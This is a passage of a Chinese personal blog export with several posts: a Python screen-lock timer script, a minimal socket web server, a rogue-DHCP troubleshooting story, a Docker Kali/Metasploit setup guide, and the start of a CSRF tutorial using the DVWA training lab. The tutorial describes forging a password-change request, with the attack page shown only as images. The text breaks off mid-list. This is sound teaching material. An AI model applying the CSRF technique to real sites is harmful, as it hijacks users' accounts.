class="string">'exit'</span>:</span><br><span class="line">                exit()</span><br><span class="line">        <span class="keyword">if</span> str(ok) == <span class="string">'y'</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> taskname,tasktime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">popthread</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">                i.start()</span><br><span class="line">        <span class="keyword">if</span> i!=<span class="number">1</span>:</span><br><span class="line">                i.setDaemon(<span class="literal">False</span>)</span><br><span class="line">                i.start()        </span><br><span class="line">             </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">        thr=[]</span><br><span class="line">        taskname,tasktime=start()</span><br><span class="line">        t1=threading.Thread(target=countertime,args=(taskname,tasktime,))</span><br><span class="line">        thr.append(t1)</span><br><span class="line">        t2=threading.Thread(target=lockscern,args=(tasktime,))</span><br><span class="line">        thr.append(t2)</span><br><span class="line">        t3=threading.Thread(target=background,args=())</span><br><span class="line">        thr.append(t3)</span><br><span class="line">        popthread(thr)  </span><br><span class="line">         </span><br><span class="line"></span><br><span class="line"><span class="string">r'''def next():</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        print("当前一次任务结束是否选择进入下一次任务？\n")</span></span><br><span class="line"><span class="string">        f=input("输入   next 下一次任务，输入  exit 退出！\n")</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        print("请点击右上角关闭透明浮窗，程序向下进行.\n")</span></span><br><span class="line"><span class="string">        if str(f)== 'exit':                </span></span><br><span class="line"><span class="string">                exit()</span></span><br><span class="line"><span class="string">        if str(f)== 'next':</span></span><br><span class="line"><span class="string">                main()</span></span><br><span class="line"><span class="string">        if str(f) not in ['next','exit']:</span></span><br><span class="line"><span class="string">                print("输入错误,程序退出!\n")'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        main()</span><br></pre></td></tr></table></figure></div>

<h2 id="代码说明测试"><a href="#代码说明测试" class="headerlink" title="代码说明测试"></a>代码说明测试</h2><p>除此之外，来说一下总体思路，本来我是打算设计的更加人性化一点的，直接上GUI，叫用户体验更好，由于比较忙，没有太多的时间去做，GUI，然后就单算直接做一个命令行DOS界面的程序先用着吧。然后结合系统的实时时间来说实时提示，然后利用windows的API来禁止I/O输入，从而达到锁屏的效果。然后为了叫用户体验更家好点，不至于看着一个DOS界面那么无聊，可以往桌面放一张名字为1.jpg的图片当背景。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/111111111112.png" data-fancybox="group" data-caption class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/111111111112.png" alt title></a></li>
</ul>
<p>这里我们在途中发现了一个问题，这里剩余时间已经出现了负数，这里的问题就是线程不同步，两个线程不是特别同步一般会差个零点几秒，我会在日后有时间想办法解决这个问题。</p>
<p>这里我们任务执行结束之后，关闭窗口，我们可以看到当前目录这里有一个txt文件来记录日志。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562487478643.png" data-fancybox="group" data-caption="1562487478643" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562487478643.png" alt="1562487478643" title="1562487478643"></a></li>
</ul>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562487522606.png" data-fancybox="group" data-caption="1562487522606" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562487522606.png" alt="1562487522606" title="1562487522606"></a></p>
<p>最后pyinstaller  打包成EXE windows64位系统都可以用。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562487541229.png" data-fancybox="group" data-caption="1562487541229" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562487541229.png" alt="1562487541229" title="1562487541229"></a></p>
<p>我把源代码放到了github上面，需要的可以去下载下来玩一下。</p>
<p><a href="https://github.com/Blue-And-White/windows-" target="_blank" rel="noopener">https://github.com/Blue-And-White/windows-</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说这个程序用到了多线程来分别开一个锁屏计时器，另外还有一个动态更新时间内容，然后开一个GUI图层来遮挡，程序运行过程中有一些小bug比如说线程的问题，总的来说功能基本可以实现，因为要考研啥的，就业没有太多的去把问题解决完，但是基本上我们可以用了，如果您有兴趣可以对代码进行修改叫他性能更加强悍，也是再次拿python练了练手，还不错。</p>
]]></content>
      <categories>
        <category>胡乱折腾</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python socket开启简单web服务</title>
    <url>/2019/06/10/python%20socket%E5%BC%80%E5%90%AF%E7%AE%80%E5%8D%95web%E6%9C%8D%E5%8A%A1%E5%8A%A0%E5%85%A5docker%E9%95%9C%E5%83%8F/</url>
    <content><![CDATA[<h1 id="python-socket开启简单web服务"><a href="#python-socket开启简单web服务" class="headerlink" title="python socket开启简单web服务"></a>python socket开启简单web服务</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近做东西，需要用python开个web服务，十分简单的即可，需要的是尽量简单，然后弄个框架（djanjo）</p>
<p>啥的，那就很麻烦，然后就想到了socket，来实现一个简单的web服务，然后通过写docker来把它存起来！</p>
<h2 id="1-python编写web服务程序"><a href="#1-python编写web服务程序" class="headerlink" title="1 . python编写web服务程序"></a>1 . python编写web服务程序</h2><p>​    要是想开启简单地服务，当然调用套接字来一下了。我们来想一下，http的简单原理（由于我们这里不是讲http协议，多的我们就不说了，我们就说http啥都不看不看请求类型，不看报头，不看状态码，不看内容，就看发过来发过去）</p>
<p>​    当客户端通过浏览器发送一个request请求的时候，然后服务端接收，成功接收后，会返回一个response，并且包含状态码，以及一些信息。 这样我们的思路就是，通过浏览器访问，然后服务器的套接字返回信息，这个信息就是http协议的响应头即可。</p>
<p>下面上代码，代码很简单。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">listen_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM) <span class="comment">#套接字操作，选择方式，绑定端口开启服务。</span></span><br><span class="line"></span><br><span class="line">listen_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">listen_socket.bind((<span class="string">'0.0.0.0'</span>,<span class="number">8080</span>))</span><br><span class="line"></span><br><span class="line">listen_socket.listen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client_conn,client_addr=listen_socket.accept()<span class="comment">#等待连接到来，然后返回信息</span></span><br><span class="line">    request=client_conn.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'recovery conn\n'</span>)  </span><br><span class="line"></span><br><span class="line">    response=<span class="string">'HTTP/1.1 200 OK\r\n'</span></span><br><span class="line">    response+=<span class="string">'Content-Type:text/html\r\n\r\n'</span></span><br><span class="line">    response+=<span class="string">'hello world'</span></span><br><span class="line">    client_conn.send(response.encode())</span><br><span class="line">    client_conn.close()</span><br></pre></td></tr></table></figure></div>



<p>我们测试一下，</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562731845336.png" data-fancybox="group" data-caption="1562732367319" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562731845336.png" alt="1562732367319" title="1562732367319"></a></li>
</ul>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562731853812.png" data-fancybox="group" data-caption="1562731853812" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562731853812.png" alt="1562731853812" title="1562731853812"></a></li>
</ul>
<p>成功，捕捉到连接！</p>
<p>那我们一个简单的web服务就构建完成了。</p>
]]></content>
      <categories>
        <category>胡乱折腾</category>
      </categories>
      <tags>
        <tag>胡乱折腾</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次坑爹的网络问题修复(DHCP服务)</title>
    <url>/2019/04/19/e8-ae-b0-e4-b8-80-e6-ac-a1-e5-9d-91-e7-88-b9-e7-9a-84-e7-bd-91-e7-bb-9c-e9-97-ae-e9-a2-98-e4-bf-ae-e5-a4-8d/</url>
    <content><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>校园网内为了给学生们规范上网特地搞了一个网络认证系统。校园网这玩意大家都知道，我们接入以太网，然后只要自动获取ip，DHCP服务器就会给我们一个地址。但是呢，今天花花打算在实验室接入内网，却怎么也接不进去，故事就这样开始了。。。。。</p>
<h2 id="开始搞事："><a href="#开始搞事：" class="headerlink" title="开始搞事："></a>开始搞事：</h2><p>本来接入学校内网，DHCP服务器会给我们分配一个临时的IP地址，供我们使用，如果有到外网的话NAT映射就行了。但是今天，我按照正常的操作流程弄了之后，打开WIN网络中心，自动获取IP,DNS服务之后，却迟迟不见响应。</p>
<p>我当时一脸蒙蔽，表情是这样的</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555676831444.png" data-fancybox="group" data-caption class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555676831444.png" alt title></a></p>
<p>what?什么情况。居然没有，我第一反应是可能是服务器的问题，响应比较慢，我就一直F5刷新网页，等着认证系统的出现，等啊等</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555676934036.png" data-fancybox="group" data-caption="1555676934036" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555676934036.png" alt="1555676934036" title="1555676934036"></a></p>
<p>居然还没有，上午还好的，不对不对，不是服务器的事情，肯定是网络出了问题。我看当时win的下面网络哪里有个小叹号，我知道，这个网络是连同的，我的网卡接口没问题。然后我就说，我看一下ip吧。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555677773985.png" data-fancybox="group" data-caption class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555677773985.png" alt title></a></p>
<p>哇，这个A段，这个IP有点6啊。看的我也是一脸懵逼。为什么会给我分配一个这么奇怪的掩码呢？</p>
<p>我就也没多想，只是感觉奇怪静态IP，把掩码改成255.255.255.0</p>
<p>这样就行了吧。结果。。。。。不行（PS：后来想想这个想法有一些傻逼）</p>
<p>我们明确了DHCP服务有问题啊！！！！</p>
<p>哈哈哈，这个可难不倒我，我有的是办法，先测试一下玩玩，看看是不是我这边出问题。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555677242216.png" data-fancybox="group" data-caption class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555677242216.png" alt title></a></p>
<p>win+r</p>
<p>输入services.msc</p>
<p>重启dhcp服务看看</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555677804023.png" data-fancybox="group" data-caption class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555677804023.png" alt title></a></p>
<p>居居居然还是这个，那我把本地连接禁用重启，居然还是这个。</p>
<p>我········</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555677319751.png" data-fancybox="group" data-caption class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555677319751.png" alt title></a></p>
<p>好吧，那就IP地址释放重新获取大法。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555677830715.png" data-fancybox="group" data-caption class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555677830715.png" alt title></a></p>
<p>我们输入 ipconfig/release</p>
<p>释放ip，然后在输入ipconfig/renew 获取ip。</p>
<p>您猜猜怎么着，居然········还是这个，是这个！</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555677849029.png" data-fancybox="group" data-caption class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555677849029.png" alt title></a></p>
<p>此时，我的心情无法用语言形容。。。。。</p>
<p>试了试Ping 网关，完全不通，显示不可达。我感觉就像把我带入了一个陌生的地带。</p>
<p>然后我打开了隔壁的一台电脑，自动获取IP，然后嘞居然人家成功了，获取到了IP。不在一个段</p>
<p>这台机器居然在</p>
<p>10.11.16.0/24这个段，这个段是可以上网的。然后我试图改为静态IP，居然提示有冲突，也就是说我现在不知道哪一个静态的IP没有被分配出去，这个就有点头疼了，所以我不决定一个一个的试，还是找问题。</p>
<p>然后我就给这台电脑重新断网重连，发现居然跟我一个段了。也是10.1.1.0/8</p>
<p>社会啊，我的哥。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555678481719.png" data-fancybox="group" data-caption class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555678481719.png" alt title></a></p>
<p>然后我就开始考虑问题，这个不是我的问题是DHCP服务器出了问题。</p>
<p>现在的我考虑可能，有人在内网接入设备了，导致DHCP服务乱了，有两台DHCP服务，不然不可能出现那台电脑。然后我就找了一台能上网的电脑，进行扫描。</p>
<p>用NMAP的DHCP服务发现脚本。</p>
<p>居然发现了在我们这个段里面居然有一台地址为10.1.1.3的服务器，里面开启了DHCP服务。</p>
<p>这里扫描的图我就不上了，因为在·另外一台电脑上，NMAP有那个扫描脚本的，脚本的原理吗，发送请求包，请求DHCP服务器响应，然后获取主机信息。</p>
<p>然后我就去找这个内网负责的小伙伴，原来真的是，前一阵子打算做一个域控来做渗透测试的练习，就弄了一个DHCP的服务器，然后这里交换机啥的VLAN都没有划分，这些广播乱串，有的时候这个教室的远控都能搞到隔壁教室。这就有点叫人emmmmmm了。不过还是找到问题了，他关闭了DHCP服务器，我们再次重新获取。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555678506302.png" data-fancybox="group" data-caption class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1555678506302.png" alt title></a></p>
<p>OK，我们成功获取，断开继续重新获取也OK了。问题解决。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这次对网络问题的排查思路还是比较乱的，现在来理一理思路，当我们以后遇到这种问题的时候，首先看看是不是硬件问题，就是网卡，然后与其他能上网的主机对比IP，如果不一样，那就可以考虑DHCP服务的问题了，我们可以从排除DHCP服务所存在的问题入手，如果出现诸如169.254.x.x 这样的畸形ip的时候，这个原因是我们无法连接到dhcp服务器。可能是我们的网络问题，也可能是dhcp服务器的问题，但是如果出现我们这种情况的时候，他不是这个windows分配给我们的一个私有ip，而是10.x.x.x这样开头的内网ip。这就说明我们连接到了dhcp服务器，但是上不了网，我们可能在另外一个域里面，这时候我们就要考虑从其他方面下手，从而解决问题，以下是我们可以参考的地方。</p>
<p>1.重启DHCP服务器</p>
<p>2.IP释放重新获取大法</p>
<p>3.考虑有人在内网又开设了一台DHCP服务器（当然是在路由器交换机规则设定不严格的情况下就会发生）</p>
<p>这样基本来说，这个问题就能够找到。</p>
]]></content>
      <categories>
        <category>胡乱折腾</category>
        <category>网络维护</category>
      </categories>
      <tags>
        <tag>网络故障修复</tag>
        <tag>胡乱搞搞</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Docker安装kali进而部署msf</title>
    <url>/2019/04/15/msf/</url>
    <content><![CDATA[<h1 id="利用Docker安装kali进而部署msf"><a href="#利用Docker安装kali进而部署msf" class="headerlink" title="利用Docker安装kali进而部署msf"></a>利用Docker安装kali进而部署msf</h1><h2 id="一，安装Docker"><a href="#一，安装Docker" class="headerlink" title="一，安装Docker"></a>一，安装Docker</h2><p>我的系统是CentenOs7</p>
<p>如果你不知道自己的Linux是什么版本的，可以利用命令简单查看一下</p>
<p>终端输入</p>
<pre><code>lsb_release</code></pre><p>当然你也可以利用各种各样的方法，其实这里感觉有点废话，言归正传，我们知道自己系统内核啥的，我们好继续进行</p>
<p>CentenOs是基于RedHat的 这一系列大家经常用到的就是yum命令了</p>
<p>Ubuntu是基于Debian的 这一系列大家常常用到胡就是apt-get命令了</p>
<p>闲话少说，我们开始吧。</p>
<p>终端输入</p>
<p> 安装Docker</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install -y docker</span><br></pre></td></tr></table></figure></div>

<p>安装成功显示compltet</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/QQ%E6%88%AA%E5%9B%BE20190410104440.png" data-fancybox="group" data-caption="QQ截图20190410104440" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/QQ%E6%88%AA%E5%9B%BE20190410104440.png" alt="QQ截图20190410104440" title="QQ截图20190410104440"></a></p>
<p>在这里我们验证一下Docker是否安装成功。</p>
<p>我们输入</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure></div>

<p>这样docker就会给我们pull下来一个镜像，当出现这个的时候，就表示OK了。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/QQ%E6%88%AA%E5%9B%BE20190410111905.png" data-fancybox="group" data-caption="QQ截图20190410111905" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/QQ%E6%88%AA%E5%9B%BE20190410111905.png" alt="QQ截图20190410111905" title="QQ截图20190410111905"></a></p>
<h2 id="二，在Docker中安装Kali进而安装Metespolit"><a href="#二，在Docker中安装Kali进而安装Metespolit" class="headerlink" title="二，在Docker中安装Kali进而安装Metespolit"></a>二，在Docker中安装Kali进而安装Metespolit</h2><p>这里我们说明一下啊，这一步确实有一点多此一举，我们是完全可以直接弄一个metespolit的框架直接来玩的，但是为了方便日后胡乱搞搞，我这里弄了一个Kali的Docker镜像。</p>
<p>在终端中键入</p>
<pre><code>docker pull kalilinux/kali-linux-docker</code></pre><p>出现如图所示的内容时候表示成功！</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/QQ%E6%88%AA%E5%9B%BE20190410145515.png" data-fancybox="group" data-caption="QQ截图20190410145515" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/QQ%E6%88%AA%E5%9B%BE20190410145515.png" alt="QQ截图20190410145515" title="QQ截图20190410145515"></a></p>
<p>我们继续向下进行</p>
<p>在终端输入</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it --name=kali kalilinux/kali-linux-docker</span><br></pre></td></tr></table></figure></div>

<p>之后我们就进入了kali的Docker镜像了。</p>
<p>在这里我们说明一下，这里我们组建的这个容器，一退出就直接没了，下一次启动我们不用再带NAME这个参数，另外如果你希望他在后台一直运行的话你可以加入-d 这个参数。</p>
<p>之后我们进行msf的安装</p>
<p>输入apt-get -y update 先更新一下源</p>
<p>之后进行安装 </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get -y --force-yes install ruby metasploit-framework</span><br></pre></td></tr></table></figure></div>

<p>在此过程中，程序比较大，大概有一个GB之多，这是因为 MSF所需要的依赖库比较多。</p>
<p>安装完成</p>
<p>在一开始运行MSF的时候，我们需要初始化数据库，这里有个坑</p>
<p>我们看到这里告诉我们5432端口找不到</p>
<p>那就是那个数据库我们得启动服务</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service postgresql start</span><br></pre></td></tr></table></figure></div>

<p>开启psql的服务，然后查看</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -pantu | grep 5432</span><br></pre></td></tr></table></figure></div>

<p>我们再看看服务</p>
<p>然后我们看到5432端口开放了</p>
<p>之后在初始化数据库，但是但是楼楼这里出了一个问题</p>
<p>那就是再次初始化还是继续失败</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfdb init</span><br></pre></td></tr></table></figure></div>

<p>这里告诉我们这里这个数据库没有连接。</p>
<p>思考一下，MSF这个数据库初始化的脚本是要连接数据库的，但是我刚才没有开启PSQL的服务，所以呢就没办法初始化，这样我们要用到Postgresql的一些知识了，我们在安装MSF框架的时候是自带Postgresql这个数据库的，我们给这个用户一个密码</p>
<p>之后我们切换这个用户</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1554994412609.png" data-fancybox="group" data-caption="1554994412609" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1554994412609.png" alt="1554994412609" title="1554994412609"></a></p>
<p>这样我们就进去了。我们需要创建一个MSF的用户以及数据库</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1554994464056.png" data-fancybox="group" data-caption="1554994464056" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1554994464056.png" alt="1554994464056" title="1554994464056"></a></p>
<p>我们键入如图所示命令，之后退出，我们进入MSF。</p>
<p>命令行键入 msfconsole</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1554994518269.png" data-fancybox="group" data-caption="1554994518269" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1554994518269.png" alt="1554994518269" title="1554994518269"></a></p>
<p>我们先输入</p>
<pre><code>db_status   #先检查数据库状态
这里一开始显示没有连接
db_connect msf:admin@127.0.0.1/msf   #这里我们进行连接
然后输入数据库名字用户密码
db_status   #再次查看状态
然后连接成功</code></pre><p>​    </p>
<p>OK，成功，好了，我们可以开始我们的MSF学习之路了。</p>
]]></content>
      <categories>
        <category>安全之路</category>
        <category>胡乱折腾</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF入门解读</title>
    <url>/2018/12/28/2018-12-28-CSRF%E5%85%A5%E9%97%A8%E8%A7%A3%E8%AF%BB/</url>
    <content><![CDATA[<h1 id="Csrf入门介绍以及dvwa靶场csrf解读"><a href="#Csrf入门介绍以及dvwa靶场csrf解读" class="headerlink" title="Csrf入门介绍以及dvwa靶场csrf解读"></a>Csrf入门介绍以及dvwa靶场csrf解读</h1><h2 id="1-什么是CSRF？"><a href="#1-什么是CSRF？" class="headerlink" title="1 什么是CSRF？"></a>1 什么是CSRF？</h2><p>Csrf（Cross-site request forgery）跨站请求伪造。首先我们来介绍一下什么叫CSRF。 攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 </p>
<p>我们举个例子深入理解：</p>
<p>正常情况下</p>
<p>某用户青花在网站上向银行发起存款请求，</p>
<p>url</p>
<p>假设为</p>
<p>xxx.xx.php?user=qinghua&amp;money=1000</p>
<p>建立</p>
<p>cookie </p>
<p>，并且确认身份就是青花。</p>
<p>  <a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562729937823.png" data-fancybox="group" data-caption="1562729937823" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562729937823.png" alt="1562729937823" title="1562729937823"></a></p>
<p>之后黑客hack发现url可以控制转账的用户，然后恶意的控制url<br>xxx.xx.php?user=hack&amp;money=1000,之后构造页面，等待别人点击上钩。</p>
<p>然后某一天，青花恰好在刚刚存完钱之后，浏览网站的时候有个美女图片，青花一激动，想看看美女长什么样，然后点击，这恰好是黑客hack构造的恶意url，之后就中招了。这时候银行那边的服务器会认为这就是qinghua，但是其实这个请求是黑客借青花之手发起的，从而就导致了青花的钱无声无息的转入黑客那里。</p>
<p><a href="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1562729994600.png" data-fancybox="group" data-caption="1562729994600" class="fancybox"><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1562729994600.png" alt="1562729994600" title="1562729994600"></a></p>
<p>看完了上述的例子，想必大家对csrf有一个基础的理解，我们来简述一下攻击流程。</p>
<ol>
<li><p>用户a访问网站，在与该网站建立请求之后，建立session，并且存储服务器返回的cookie。</p>
</li>
<li><p>用户a访问玩用户之后并没有退出网站，没有断开连接。之后访问其他网站。</p>
</li>
<li><p>黑客构造了恶意网站诱导用户a点击，通过用户a的浏览器执行，这时候服务器会执行该恶意请求，其实这个请求并不是a发出的，而是黑客发出的，他只是借用了用户a的身份，从而在a的权利下进行操作。</p>
</li>
</ol>
<p>在理解完csrf的简单介绍后，我们来用dvwa靶场的环境来简单的搞一搞csrf，以便加深对csrf的理解。</p>
<h2 id="2-DVWA靶场简单练习"><a href="#2-DVWA靶场简单练习" class="headerlink" title="2.DVWA靶场简单练习"></a>2.DVWA靶场简单练习</h2><h3 id="2-1LOW级别"><a href="#2-1LOW级别" class="headerlink" title="2.1LOW级别"></a>2.1LOW级别</h3><ul>
<li><p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730067860.png" data-fancybox="group" data-caption="1562730067860" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730067860.png" alt="1562730067860" title="1562730067860"></a></p>
</li>
<li><p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730081750.png" data-fancybox="group" data-caption="1562730081750" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730081750.png" alt="1562730081750" title="1562730081750"></a></p>
</li>
</ul>
<p>我们看url，这里被修改掉了。当用户登录的时候，点击黑客构造的恶意链接，就会无形中修改我们的密码，我们举个例子，当然在这个页面这种直接暴露Url的连接成功率还是比较低的。那么怎么利用呢，我们看下面。</p>
<p>首先我们构造一个恶意的页面</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730110765.png" data-fancybox="group" data-caption="1562730110765" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730110765.png" alt="1562730110765" title="1562730110765"></a></p>
<p>当用户点击查看这个连接就会跳转到这个页面</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730142208.png" data-fancybox="group" data-caption="1562730142208" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730142208.png" alt="1562730142208" title="1562730142208"></a></p>
<p>这个是代码。当我们在登录dvwa的时候访问该页面，就会修改我们dvwa的密码为qinghua.</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730168844.png" data-fancybox="group" data-caption="1562730168844" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730168844.png" alt="1562730168844" title="1562730168844"></a></p>
<p>我们现在假设我们点击这个查看美女图片</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730192769.png" data-fancybox="group" data-caption="1562730192769" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730192769.png" alt="1562730192769" title="1562730192769"></a></p>
<p>虽然这里显示了美女图片，但是在已经暗中执行了恶意代码。</p>
<ul>
